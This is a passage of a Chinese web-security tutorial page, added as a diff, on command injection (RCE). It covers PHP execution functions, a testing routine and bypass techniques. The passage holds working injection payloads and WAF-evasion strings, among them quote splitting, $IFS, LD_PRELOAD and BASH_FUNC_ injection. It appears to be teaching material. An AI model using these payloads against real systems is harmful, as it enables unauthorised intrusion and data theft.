@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>命令执行漏洞(RCE) · Maple/G7</title>
+<meta name="description" content="RCE 不是一种漏洞类别，而是攻击结果。从命令拼接与转义讲起，走过 PHP 的各个执行函数、测试流程、十来种绕过手法，再到无回显、无参数、无字母数字的取数方式。">
+<script>document.documentElement.classList.add('js');</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;500&family=Noto+Serif+SC:wght@400;600;900&family=Noto+Sans+SC:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css?v=v22">
+</head>
+<body class="page-post">
+
+<div class="grain" aria-hidden="true"></div>
+<div class="rule-rail" aria-hidden="true"></div>
+<div class="progress" id="progress" aria-hidden="true"></div>
+<div class="cursor" id="cursor" aria-hidden="true"><span class="cursor-ring"></span><span class="cursor-dot"></span></div>
+
+<header class="topbar">
+  <a class="brand" href="index.html">
+    <span class="brand-mark">Maple<span class="t-slash">/</span>G7</span>
+  </a>
+  <nav class="nav">
+    <a href="index.html">首页</a>
+    <a href="notes.html" class="is-on">文章</a>
+    <a href="projects.html">项目</a>
+    <a href="links.html">友链</a>
+    <a href="about.html">关于</a>
+  </nav>
+  <p class="topbar-meta mono">VOL.01 / 2026</p>
+</header>
+
+<article class="post">
+
+  <header class="cover">
+    <div class="cover-art" aria-hidden="true">
+      <img src="img/cover-rce.webp" alt="" style="object-position: 50% 42%" fetchpriority="high" decoding="async">
+    </div>
+    <div class="cover-ticks" aria-hidden="true"><i></i><i></i><i></i><i></i></div>
+
+    <div class="cover-inner">
+      <p class="kicker mono"><span class="k-no">01</span>NOTES <em>·</em> Web安全基础 <em>·</em> 2026.11.26</p>
+      <h1 class="post-title">命令执行漏洞(RCE)</h1>
+      <p class="post-desc">RCE 不是一种漏洞类别，而是攻击结果。从命令拼接与转义讲起，走过 PHP 的各个执行函数、测试流程、十来种绕过手法，再到无回显、无参数、无字母数字的取数方式。</p>
+
+      <ul class="post-meta mono">
+        <li><b>4,661</b>字</li>
+        <li class="meta-tags"><b>TAGS</b><ul class="tag-list"><li>命令执行</li><li>RCE</li><li>绕过技巧</li><li>反弹Shell</li></ul></li>
+      </ul>
+
+      <div class="cover-seal" aria-hidden="true"><span>墨</span></div>
+    </div>
+  </header>
+
+  <nav class="post-bar">
+    <a class="post-back" href="notes.html" data-hover><span>←</span>全部文章</a>
+    <span class="post-bar-mid mono">Web安全基础 · 4,661 字</span>
+  </nav>
+
+  <div class="layout">
+
+    <aside class="toc">
+      <div class="toc-sticky">
+        <p class="rail-h mono">INDEX</p>
+        <ol class="toc-list"><li class="toc-item toc-l1"><a href="#s1" data-toc="s1"><span class="toc-no">01</span><span class="toc-tx">一、 命令执行的原理</span></a></li><li class="toc-item toc-l1"><a href="#s2" data-toc="s2"><span class="toc-no">02</span><span class="toc-tx">二、命令执行基础</span></a></li><li class="toc-item toc-l2"><a href="#s3" data-toc="s3"><span class="toc-no">03</span><span class="toc-tx">2.1 转义字符</span></a></li><li class="toc-item toc-l2"><a href="#s4" data-toc="s4"><span class="toc-no">04</span><span class="toc-tx">2.2 多条命令执行</span></a></li><li class="toc-item toc-l2"><a href="#s5" data-toc="s5"><span class="toc-no">05</span><span class="toc-tx">2.3 注释符号</span></a></li><li class="toc-item toc-l2"><a href="#s6" data-toc="s6"><span class="toc-no">06</span><span class="toc-tx">2.4 PHP相关函数</span></a></li><li class="toc-item toc-l3"><a href="#s7" data-toc="s7"><span class="toc-no">07</span><span class="toc-tx">PHP调用操作系统命令的函数</span></a></li><li class="toc-item toc-l3"><a href="#s8" data-toc="s8"><span class="toc-no">08</span><span class="toc-tx">PHP 动态执行代码、动态调用函数</span></a></li><li class="toc-item toc-l1"><a href="#s9" data-toc="s9"><span class="toc-no">09</span><span class="toc-tx">三、命令执行的基本测试流程 (SOP)</span></a></li><li class="toc-item toc-l2"><a href="#s10" data-toc="s10"><span class="toc-no">10</span><span class="toc-tx">3.1 找可疑注入点</span></a></li><li class="toc-item toc-l2"><a href="#s11" data-toc="s11"><span class="toc-no">11</span><span class="toc-tx">3.2 Fuzz 测试</span></a></li><li class="toc-item toc-l1"><a href="#s12" data-toc="s12"><span class="toc-no">12</span><span class="toc-tx">四、RCE的绕过</span></a></li><li class="toc-item toc-l2"><a href="#s13" data-toc="s13"><span class="toc-no">13</span><span class="toc-tx">4.1 空格绕过</span></a></li><li class="toc-item toc-l2"><a href="#s14" data-toc="s14"><span class="toc-no">14</span><span class="toc-tx">4.2 编码绕过</span></a></li><li class="toc-item toc-l2"><a href="#s15" data-toc="s15"><span class="toc-no">15</span><span class="toc-tx">4.3 通配符绕过</span></a></li><li class="toc-item toc-l2"><a href="#s16" data-toc="s16"><span class="toc-no">16</span><span class="toc-tx">4.4 Shell 语法解析绕过</span></a></li><li class="toc-item toc-l2"><a href="#s17" data-toc="s17"><span class="toc-no">17</span><span class="toc-tx">4.5 环境变量拼接</span></a></li><li class="toc-item toc-l2"><a href="#s18" data-toc="s18"><span class="toc-no">18</span><span class="toc-tx">4.6 环境变量注入</span></a></li><li class="toc-item toc-l1"><a href="#s19" data-toc="s19"><span class="toc-no">19</span><span class="toc-tx">五、执行无回显</span></a></li><li class="toc-item toc-l2"><a href="#s20" data-toc="s20"><span class="toc-no">20</span><span class="toc-tx">5.1 写入 Web 可访问目录</span></a></li><li class="toc-item toc-l2"><a href="#s21" data-toc="s21"><span class="toc-no">21</span><span class="toc-tx">5.2 反弹 Shell</span></a></li><li class="toc-item toc-l2"><a href="#s22" data-toc="s22"><span class="toc-no">22</span><span class="toc-tx">5.3 带外外带</span></a></li><li class="toc-item toc-l2"><a href="#s23" data-toc="s23"><span class="toc-no">23</span><span class="toc-tx">5.4 时间盲注</span></a></li><li class="toc-item toc-l1"><a href="#s24" data-toc="s24"><span class="toc-no">24</span><span class="toc-tx">六、无参数RCE</span></a></li><li class="toc-item toc-l1"><a href="#s25" data-toc="s25"><span class="toc-no">25</span><span class="toc-tx">七、无字母数字RCE</span></a></li></ol>
+        <img class="toc-mo" src="img/mo-01.webp" alt="" aria-hidden="true">
+      </div>
+    </aside>
+
+    <div class="prose"><p>命令执行一般发生在远程，故被称为远程命令执行，即RCE（Remote Command Exec）​，也被称为RCE（Remote Code Exec）​。</p>
+<p>RCE 不是一种漏洞类别，而是<strong>攻击结果</strong>。外部输入的数据，被服务器当成了代码或系统命令执行。</p>
+<p>通过RCE可以实现：</p>
+<ul><li><p>偷数据（读系统文件、源码、数据库配置）。</p></li><li><p>反弹Shell（拿到交互式终端，像操作本地电脑一样）。</p></li><li><p>留后门（写入Webshell，哪怕漏洞被修了还能进来）。</p></li><li><p>当跳板（进入内网，攻击内网其他机器）。</p></li></ul>
+<p>我们经常通过SSRF、Log4j2、文件上传等漏洞，组合利用作为入口，最终触发RCE。</p>
+<blockquote><p>几篇文章： <a href="https://blog.csdn.net/m0_46374969/article/details/117291842?sharetype=blog&amp;shareId=117291842&amp;sharerefer=APP&amp;sharesource=vivi_ask&amp;sharefrom=link">Linux知识点总结-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/weixin_44288604/article/details/111740527">反弹shell汇总，看我一篇就够了-CSDN博客</a></p></blockquote>
+<hr>
+<h1 id="s1">一、 命令执行的原理<a class="h-link" href="#s1" aria-hidden="true">§</a></h1>
+<p>在各类编程语言中，为了方便程序处理，通常会存在各种执行外部程序的函数，当调用函数执行命令且未对输入做过滤时，通过注入恶意命令，会造成巨大的危害。</p>
+<p>比如：</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">system</span>(<span class="hljs-string">"echo"</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'d'</span>])</code></pre></div>
+<p>传参<code>?d=for test%26%26whoami</code>（注意一定要编码，&amp;会被Web服务器直接当做分隔符），网页会多出whoami程序的执行结果，这是因为当前在系统执行的命令为“echo for test&amp;&amp;whoami”​。</p>
+<p>在各类编程语言中，​“&amp;&amp;”是and语法的表达，类似的语法还有“||”表示or。</p>
+<p>注意，它们存在惰性，在and语法中，若第一个表达式的结果为假，则第二个表达式不会执行，因为它恒为假。与or语法类比，若第一个表达式为真，则第二个表达式也不会执行，因为它恒为真。</p>
+<p>命令注入就是通过注入一些特殊字符，改变原本的执行意图，从而执行攻击者指定的命令。</p>
+<hr>
+<h1 id="s2">二、命令执行基础<a class="h-link" href="#s2" aria-hidden="true">§</a></h1>
+<h2 id="s3">2.1 转义字符<a class="h-link" href="#s3" aria-hidden="true">§</a></h2>
+<p>系统中的cmd.exe、bash程序执行命令能够解析很多特殊字符，它们的存在让BAT批处理和bash脚本处理工作更加便捷，但是如果想去掉特殊字符的特殊意义，就需要进行转义。</p>
+<p>转义字符即为取消字符的特殊意义。</p>
+<p><strong>Windows的转义字符为“^”​，Linux的转义字符为“\”​。</strong></p>
+<figure class="fig"><img src="img/rce-1.webp" alt="f162d991-9f50-480c-8c24-0c372eac22c3" loading="lazy" decoding="async"></figure>
+<h2 id="s4">2.2 多条命令执行<a class="h-link" href="#s4" aria-hidden="true">§</a></h2>
+<p>在命令注入中通常需要注入多条命令来扩大危害，所以需要利用一些特殊字符来拼接命令。</p>
+<ul><li><p>Windows下，&amp;&amp;、||、%0a</p></li><li><p>Linux下，&amp;&amp;、||、​；​、$()、``、%0a、%0d。</p></li></ul>
+<p>注：</p>
+<ol><li><p><strong>%0a和%0d</strong> %0a：在 URL 编码中代表换行符（Line Feed，简称 LF），对应 ASCII 码的 10（十六进制 0A）。 %0d：在 URL 编码中代表回车符（Carriage Return，简称 CR），对应 ASCII 码的 13（十六进制 0D）。 在 Windows 系统中，通常用 %0d%0a 组合来表示真正的回车换行，而在 Linux 下 %0a 就足够了。WAF（防火墙）经常拦截 &amp;&amp;、||、; 这些符号，但很多时候会漏掉对 %0a（换行）的拦截。这是实战中非常经典的绕过技巧。</p></li><li><p><strong>命令替换符：$()和反引号</strong></p>
+<p>在Linux下他们叫命令替换。遇到$()和\<code>\</code>包裹的，先执行里面的内容，把执行结果拿出来，<strong>替换</strong>到当前位置，再执行整个大命令。 比如：<code>echo "$(id)"</code>，会先执行id命令，得到结果<code>uid=0(root)...</code>。然后把这个结果填进双引号里，变成 <code>echo "uid=0(root)..."</code>。最后再执行 <code>echo</code>。 注意：这里是<strong>双引号</strong>！！！在Linux中，双引号包裹的字符串“$()”或“\<code>\</code>”中的内容被当作命令执行，但是单引号包括的字符串就是纯字符串，不会进行任何解析。</p></li></ol>
+<h2 id="s5">2.3 注释符号<a class="h-link" href="#s5" aria-hidden="true">§</a></h2>
+<p>与代码注释一样，当合理利用时，命令执行能够使命令后面的其他字符成为注释内容。</p>
+<ul><li><p>Windows的注释符号为“::”​，在BAT批处理脚本中用得较多</p></li><li><p>Linux的注释符号为“＃”​，在bash脚本中用得较多。</p></li></ul>
+<h2 id="s6">2.4 PHP相关函数<a class="h-link" href="#s6" aria-hidden="true">§</a></h2>
+<h3 id="s7">PHP调用操作系统命令的函数<a class="h-link" href="#s7" aria-hidden="true">§</a></h3>
+<ul><li><p><strong>system(command, result_code)</strong>：</p>
+<p>第一个参数必填，第二个参数为命令执行完的退出状态码（0代表成功）</p>
+<p>命令执行的结果直接输出页面或终端</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">&lt;?php
+<span class="hljs-keyword">system</span>(<span class="hljs-string">"whoami"</span>);  <span class="hljs-comment">//www-data</span>
+<span class="hljs-variable">$result</span> = <span class="hljs-keyword">system</span>(<span class="hljs-string">"whoami"</span>); 
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;PHP返回值："</span>;
+<span class="hljs-keyword">var_dump</span>(<span class="hljs-variable">$result</span>);  <span class="hljs-comment">// string(8) "www-data"</span>
+?&gt;</code></pre></div>
+<p><code>$result</code> 接收命令输出的最后一行，作为函数返回值。失败返回false</p>
+<p>（函数的返回值跟函数本身输出一个字符串是两件事情）</p></li><li><p><strong>shell_exec(string $command)</strong>：</p>
+<p>执行命令，不会直接输出内容，需要配合 <code>echo</code> 或 <code>print_r</code> 把结果显示出来；</p>
+<p>返回完整标准输出字符串；</p>
+<p>没有输出或发生错误时可能返回 NULL，无法建立管道时可能返回 false，不能只凭 NULL 判断命令执行失败。</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">&lt;?php
+<span class="hljs-variable">$result</span> = <span class="hljs-keyword">shell_exec</span>(<span class="hljs-string">"id"</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;   <span class="hljs-comment">//www-data</span>
+<span class="hljs-keyword">print_r</span>(<span class="hljs-variable">$result</span>);   
+?&gt;</code></pre></div></li><li><p><strong>exec(string $command, array &amp;$output, int &amp;$result_code)</strong>：</p>
+<p>执行命令，不能直接输出内容；函数返回值只返回命令结果的最后一行内容，配合 echo；</p>
+<p>或者用第二个参数接收全部输出行（第二个参数 <code>$output</code> 是一个<strong>引用传递的数组</strong>。<code>exec()</code> 会将命令执行的每一行输出追加到这个数组中）</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">&lt;?php
+<span class="hljs-variable">$result</span> = <span class="hljs-keyword">exec</span>(<span class="hljs-string">"whoami"</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">//www-data</span>
+?&gt;
+
+
+&lt;?php
+<span class="hljs-keyword">exec</span>(<span class="hljs-string">"whoami"</span>, <span class="hljs-variable">$output</span>); 
+<span class="hljs-keyword">print_r</span>(<span class="hljs-variable">$output</span>);  <span class="hljs-comment">// Array([0] =&gt; www-data)</span>
+<span class="hljs-comment">//因为 whoami 只输出了一行结果，所以数组只有一个元素 [0] =&gt; www-data</span>
+?&gt;</code></pre></div></li><li><p><strong>passthru(command,result_code)</strong>：</p>
+<p>和system()类似；</p>
+<p>执行命令，直接输出全部原始结果；特别适合输出二进制数据（如图片）</p>
+<p>没有有效返回值（成功时返回 <code>null</code>，失败时返回 <code>false</code>）</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">&lt;?php
+<span class="hljs-keyword">passthru</span>(<span class="hljs-string">"whoami"</span>);  <span class="hljs-comment">// www-data</span>
+?&gt;</code></pre></div></li></ul>
+<h3 id="s8">PHP 动态执行代码、动态调用函数<a class="h-link" href="#s8" aria-hidden="true">§</a></h3>
+<ul><li><p><strong>eval(string $code)</strong>：</p>
+<p>如果禁用了上述这些系统命令执行函数，可以通过动态执行代码、动态调用函数，这些函数会把输入代码块语句块直接执行</p>
+<p>把字符串当成 PHP 代码去执行，它本身不会自动输出内容</p></li><li><p><strong>assert()</strong>：</p>
+<p>这是 PHP 中的断言函数，主要用于检查一个预期条件是否成立，如果不成立（为 <code>false</code>），程序就会抛出 <code>AssertionError</code> 异常并中断。这在日常开发中用于调试。</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">&lt;?php
+<span class="hljs-variable">$age</span> = <span class="hljs-number">22</span>;
+<span class="hljs-keyword">assert</span>(<span class="hljs-variable">$age</span> &gt;= <span class="hljs-number">18</span>); <span class="hljs-comment">// 如果 $age 小于 18，程序报错</span>
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"条件成立"</span>;
+?&gt;</code></pre></div>
+<p>在 PHP 8.0 之前的版本，assert函数存在一个特性：如果传入的参数是一个字符串，PHP 会把它当作 <strong>PHP 代码来执行</strong>（效果等同于 <code>eval()</code>），一旦参数可控就会导致任意代码执行。</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">&lt;?php
+<span class="hljs-keyword">assert</span>(<span class="hljs-string">"echo 'Hello';"</span>);
+?&gt;
+
+&lt;?php
+<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'cmd'</span>]; 
+<span class="hljs-keyword">assert</span>(<span class="hljs-variable">$cmd</span>); <span class="hljs-comment">// 传入 ?cmd=system('ls'); 即可执行系统命令</span>
+?&gt;</code></pre></div>
+<p>注：</p>
+<p>能否成功利用，受 PHP 版本和 <code>php.ini</code> 中 <strong><code>zend.assertions</code></strong> 配置的双重限制：</p>
+<ul><li><p><code>zend.assertions = 1</code>：<strong>开启</strong>，断言代码正常编译和执行。</p></li><li><p><code>zend.assertions = 0</code>：<strong>生成但不执行</strong>代码。</p></li><li><p><code>zend.assertions = -1</code>：<strong>完全关闭</strong>（生产环境默认）。PHP 引擎在编译阶段会直接<strong>删掉（跳过）</strong> <code>assert()</code> 里面的逻辑完全不执行。</p></li></ul></li><li><p><strong>call_user_func()</strong></p>
+<p>动态回调。用于调用函数，第一个参数是函数名(字符串形式)，第二个参数是函数参数。</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs">&lt;?php
+<span class="hljs-keyword">function</span> <span class="hljs-title">sayHello</span>($<span class="hljs-variable">$name</span>) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello, $$name!"</span>;
+}
+
+<span class="hljs-title">call_user_func</span>(<span class="hljs-string">'sayHello'</span>, <span class="hljs-string">'World'</span>); <span class="hljs-comment">// 输出: Hello, World!</span>
+<span class="hljs-title">call_user_func</span>(<span class="hljs-string">'system'</span>,<span class="hljs-string">'whoami'</span>); <span class="hljs-comment">//输出whoami的内容</span>
+<span class="hljs-title">call_user_func</span>(<span class="hljs-string">'phpinfo'</span>);  <span class="hljs-comment">//执行phpinfo</span></code></pre></div></li></ul>
+<hr>
+<h1 id="s9">三、命令执行的基本测试流程 (SOP)<a class="h-link" href="#s9" aria-hidden="true">§</a></h1>
+<p>我们需要确认命令注入点存在的位置，然后由于我们不清楚后端代码具体长什么样，所以需要通过各种Fuzz来确认黑名单和闭合之类，最终确认漏洞存在。</p>
+<h2 id="s10">3.1 找可疑注入点<a class="h-link" href="#s10" aria-hidden="true">§</a></h2>
+<p>明确注入位置，知道哪个地方输入的数据会被当作参数执行。</p>
+<ul><li><p><strong>黑盒测试</strong>： 有些业务功能，web程序自己用代码写不出来，必须得调用操作系统的底层命令，这些地方就是可能会存在命令注入的地方。 常见的：</p>
+<ul><li><p><strong>网络诊断类（最常见）</strong>：比如网页上有个“Ping 测试”、“Traceroute 追踪”、“DNS 解析”。我们输入 IP，后台肯定是在跑 <code>ping xxx</code>。</p></li><li><p><strong>文件处理类</strong>：比如“图片压缩”、“格式转换”、“在线解压压缩包”、“文档预览”。后台可能在跑 <code>convert xxx</code>、<code>tar -zxvf xxx</code>。</p></li><li><p><strong>系统管理类</strong>：后台管理面板里的“重启服务器”、“查看系统日志”、“清空缓存”、“数据库备份”。</p></li><li><p><strong>特殊组件</strong>：比如网站用了旧版的 Jenkins、旧版的 Webmin 面板，或者像Log4j2 这种第三方组件。</p></li></ul></li><li><p><strong>白盒审计</strong>： 有源码的情况肯定是先全局搜索“危险函数”，只要外部输入的数据（比如 <code>$_GET</code>、<code>$_POST</code>）没有经过严格过滤，直接进入了下面这些函数，那就是绝对的注入点：</p>
+<ul><li><p><strong>PHP</strong>：<code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>、<code>popen()</code>、<strong>反引号 `<code> </code> ``</strong>。</p></li><li><p><strong>Java</strong>：<code>Runtime.getRuntime().exec()</code>、<code>ProcessBuilder</code>。</p></li><li><p><strong>Python</strong>：<code>os.system()</code>、<code>subprocess.Popen()</code>。</p></li></ul></li></ul>
+<h2 id="s11">3.2 Fuzz 测试<a class="h-link" href="#s11" aria-hidden="true">§</a></h2>
+<p>我们不清楚后端代码究竟是什么样的，往往需要Fuzz测试有无引号闭合，如何闭合，有哪些字符被过滤了等，去推测后端代码长什么样。如果它前端有回显，就直接根据回显判断就行了，但往往系统有容错机制（报错不显示在前端）或者他是一个盲注（没有回显），这个时候就要用到OOB（带外测试）。</p>
+<p>考虑到效率，还有环境兼容性，我们做测试，一开始肯定是用的<code>echo 123</code> 或 <code> whoami</code>这样的简单命令去测试，如果有回显，那可以直接测。</p>
+<p>如果没有回显，再换上包含 VPS/DNSLog 的 Fuzz 字典测试，如果有动静，证明漏洞存在且能出网。接下来就是直接反弹 Shell，万事大吉。</p>
+<p>但就算都没动静也不能完全断定没有漏洞，得考虑是不是出网受限（只准 DNS，不准 HTTP），或者根本就没装 <code>curl</code>，或者<code>curl</code>、<code>wget</code> 这种外带命令被WAF被拦截了。</p>
+<hr>
+<h1 id="s12">四、RCE的绕过<a class="h-link" href="#s12" aria-hidden="true">§</a></h1>
+<h2 id="s13">4.1 空格绕过<a class="h-link" href="#s13" aria-hidden="true">§</a></h2>
+<p>ASCII空格（<code>0x20</code>）</p>
+<ul><li><p><strong>url编码</strong>：%09(Tab) %20(space)</p></li><li><p><strong>$IFS：</strong> 一个环境变量，叫做内部字段分隔符，是 Shell 用来拆分参数的分隔符变量（默认含空格、Tab、换行），能靠触发词拆分代替空格分隔命令和参数（如 <code>cat$IFS$9/flag</code>）。</p>
+<p>常见的写法：${IFS}，$IFS$9 (系统shell进程第九个参数的持有者，通常为空)</p>
+<p>加上 <code>$9</code> 或 <code>${IFS}</code> 主要是为了划清变量名边界、防止被当成新变量名</p></li><li><p><strong>花括号扩展：</strong> 比如{cat,/flag}，Shell 在执行前会把逗号分隔的花括号展开成 cat /flag</p>
+<p>局限：依赖支持花括号扩展的 shell，比如dash 不支持， bash支持</p></li><li><p><strong>重定向字符：</strong> <code>&lt;</code> 输入重定向 cat&lt;/flag，把&lt;后面跟的文件取代键盘作为新的输入设备；<code>&gt;</code>输出重定向 cat /flag &gt; 1.txt</p></li></ul>
+<h2 id="s14">4.2 编码绕过<a class="h-link" href="#s14" aria-hidden="true">§</a></h2>
+<p>绕过一些关键字，常见的有：</p>
+<ul><li><p>base64绕过</p></li><li><p>Hex编码（纯16进制ASCII码-一串数字）</p></li><li><p>shellcode编码（\x开头的16进制转义）</p></li></ul>
+<h2 id="s15">4.3 通配符绕过<a class="h-link" href="#s15" aria-hidden="true">§</a></h2>
+<p>常见的通配符：</p>
+<ul><li><p><code>*</code>：匹配 0 个或多个任意字符（如 ”/f*“ 匹配 ”/flag“）。</p></li><li><p><code>?</code>：匹配<strong>单个</strong>任意字符（如 ”/fl?g“ 匹配 “/flag”）。</p></li><li><p><code>[...]</code>：匹配方括号内<strong>单个</strong>字符（如"fl[a-c]g" 匹配"flag","flbg","flcg"）</p>
+<p><code>[!...]</code> 或 <code>[^...]</code> 表示取反</p></li><li><p><code>{a,b}</code>：匹配大括号内的任意一个字符串（ 如："fl{abc,def}g"匹配"flabcg","fldefg"）</p></li></ul>
+<h2 id="s16">4.4 Shell 语法解析绕过<a class="h-link" href="#s16" aria-hidden="true">§</a></h2>
+<p>利用 PHP 过滤与 Shell 实际1解析之间的差异。</p>
+<ul><li><p><strong>空引号与分段引号拼接</strong></p>
+<p>写法：<code>ca""t /fl''ag</code>、<code>c"a"t /f'l'ag</code></p>
+<p>PHP正则检查看到的是被引号打断的片段，匹配不到连续的 <code>cat</code> 或 <code>flag</code>；Shell 解析时会去掉成对引号，拼回完整命令与路径。</p></li><li><p><strong>反斜杠转义</strong></p>
+<p>写法：<code>ca\t /fl\ag</code></p>
+<p>普通字母前的 <code>\</code> 在 Shell 中不改变字母本身含义，但会打断正则对连续字符串的匹配。</p></li><li><p><strong>变量拼接绕过</strong></p>
+<p>写法：<code>a=l;b=s;$a$b</code>、<code>b=fl;cat /${b}ag</code></p>
+<p>变量后面紧跟普通字母时要用大括号 <code>{}</code> 隔开（如 <code>${b}ag</code>），否则 Shell 会去读取名为 <code>$bag</code> 的变量。</p></li></ul>
+<h2 id="s17">4.5 环境变量拼接<a class="h-link" href="#s17" aria-hidden="true">§</a></h2>
+<p><strong>不直接写敏感词，而是从系统环境变量或已有变量里“截取/删减”出需要的字符，再拼成命令或文件名</strong>。</p>
+<p>环境变量 Linux 系统运行起来后，默认会在后台存一堆“全局变量”（比如当前路径、语言设置、系统目录等），在命令行敲 <code>env</code> 就能全看出来，用 <code>$变量名</code> 就能直接取它的值。</p>
+<ul><li><p><code>${变量:起始:长度}</code></p></li><li><p><code>#</code>、<code>##</code>、<code>%</code>、<code>%%</code>：用前缀/后缀匹配删除来截取想要的字符，<code>#</code> 删前，<code>%</code> 删后，单写就是只匹配一次，双写就是尽可能多次匹配，直至没有。</p></li></ul>
+<p>示例：</p>
+<p>比如系统里有环境变量 <code>LANG=en_US.UTF-8</code>，标好下标：</p>
+<p><code>0:e 1:n 2:_ 3:U 4:S 5:. 6:U 7:T 8:F 9:- 10:8</code></p>
+<p>比如想凑字母 <code>U</code>、<code>T</code>、<code>F</code>：</p>
+<ul><li><p><code>${LANG:3:1}</code> → <code>U</code></p></li><li><p><code>${LANG:7:1}</code> → <code>T</code></p></li><li><p><code>${LANG:8:1}</code> → <code>F</code></p></li></ul>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"><span class="hljs-keyword">echo</span> ${LANG:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>}${LANG:<span class="hljs-number">7</span>:<span class="hljs-number">1</span>}${LANG:<span class="hljs-number">8</span>:<span class="hljs-number">1</span>}
+<span class="hljs-comment"># 展开后是：echo UTF</span></code></pre></div>
+<p>比如想只留后缀 <code>UTF-8</code>（删掉前面的 <code>en_US.</code>，共 6 个字符）:</p>
+<ul><li><p><code>${LANG:6}</code>（从索引 6 到结尾）→ <code>UTF-8</code></p></li><li><p>或者用 <code>#</code> 从左删到 <code>.</code>：<code>${LANG#*.}</code> → <code>UTF-8</code></p></li></ul>
+<h2 id="s18">4.6 环境变量注入<a class="h-link" href="#s18" aria-hidden="true">§</a></h2>
+<p>当命令本身写死或不可控，但<strong>环境变量可控</strong>时，利用 Shell 或动态链接器加载环境变量的机制，把恶意代码/命令塞进去执行。</p>
+<ol><li><p><strong><code>LD_PRELOAD</code> 劫持共享库（常用于绕过 <code>disable_functions</code>）</strong></p>
+<p>进程启动或加载动态库时，若设置了 <code>LD_PRELOAD</code>，会优先加载指定的 <code>.so</code> 文件并执行其中的构造函数/劫持函数。</p>
+<p><strong>利用条件</strong>：需要能写入 <code>.so</code> 文件（如配合文件上传点，后缀名往往不限），且后续有会加载该库或启动新进程的函数/命令被触发。</p></li><li><p><strong>通过特殊环境变量注入命令（结合 Shell 特性）</strong></p>
+<p>PHP 的 <code>system()</code> 底层常通过 <code>popen()</code> 调用 <code>/bin/sh -c "..."</code>。不同系统下 <code>/bin/sh</code> 指向不同（Debian/Ubuntu 常见 <code>dash</code>，CentOS/RHEL 常见 <code>bash</code>），可利用的环境变量也分场景：</p>
+<ul><li><p><strong><code>BASH_FUNC_</code> 导入函数（重点，CentOS / Bash 场景常见）</strong></p>
+<ul><li><p><strong>原理</strong>：Bash 启动初始化环境变量时，会识别特定格式的变量名并注册成 Shell 函数；如果定义的函数名和后面执行的命令同名（比如覆盖 <code>echo</code>），执行原命令时就会跑进注入的函数体。</p></li><li><p><strong>常见写法差异</strong>（与 ShellShock 修复补丁和版本有关）：</p>
+<ul><li><p>Bash 4.4 及以上：<code>BASH_FUNC_echo%%=() { id; }</code></p></li><li><p>部分打了补丁的 Bash 4.2（如 CentOS 7）：<code>BASH_FUNC_echo()=() { id; }</code></p></li><li><p>未修复 ShellShock 的老版本：可直接用函数定义后跟命令的格式测试。</p></li></ul></li></ul></li><li><p><strong>启动/交互相关变量（受限于启动参数或交互模式）</strong></p>
+<ul><li><p><code>BASH_ENV</code>：非交互式 <code>bash -c</code> 时可触发，但若以 <code>sh</code> 名义调用（<code>act_like_sh</code> 为真）通常不会走这条逻辑。</p></li><li><p><code>ENV</code>：多在交互式或带 <code>-i</code> 参数（如 <code>sh -i -c</code>）时生效，普通 <code>sh -c</code> 下往往不触发。</p></li><li><p><code>PS1</code> / <code>PROMPT_COMMAND</code>：偏交互式 Shell 场景，非交互 <code>-c</code> 场景局限较大。</p></li></ul></li></ul></li></ol>
+<hr>
+<h1 id="s19">五、执行无回显<a class="h-link" href="#s19" aria-hidden="true">§</a></h1>
+<p>命令在后台执行了，但页面不显示结果。解决方向是<strong>把结果写到能看的地方、带出来，或者靠时间/行为判断</strong>。</p>
+<h2 id="s20">5.1 写入 Web 可访问目录<a class="h-link" href="#s20" aria-hidden="true">§</a></h2>
+<ul><li><p><strong>做法</strong>：把命令输出重定向到 Web 根目录下的文件，再通过浏览器访问该文件。</p></li><li><p><strong>示例</strong>：<code>cat /flag &gt; /var/www/html/o.txt</code>（随后访问对应网页查看 <code>o.txt</code>）。</p></li><li><p><strong>前提与坑</strong>：目标目录要有写权限、知道 Web 路径，且文件名别和敏感词冲突（若 <code>/flag</code> 读不到，先看 <code>ls</code> 或环境变量）。</p></li></ul>
